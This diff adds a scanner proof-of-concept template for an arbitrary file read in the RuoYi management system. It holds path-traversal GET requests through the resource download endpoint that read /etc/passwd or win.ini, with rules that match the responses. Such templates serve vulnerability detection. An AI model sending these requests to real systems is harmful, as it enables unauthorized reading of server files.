@@ -1,0 +1,16 @@
+name: poc-yaml-ruoyi-management-fileread
+groups:
+  linux:
+    - method: GET
+      path: /common/download/resource?resource=/profile/../../../../etc/passwd
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  windows:
+    - method: GET
+      path: /common/download/resource?resource=/profile/../../../../Windows/win.ini
+      expression: |
+        response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+detail:
+  author: MaxSecurity(https://github.com/MaxSecurity)
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931.md
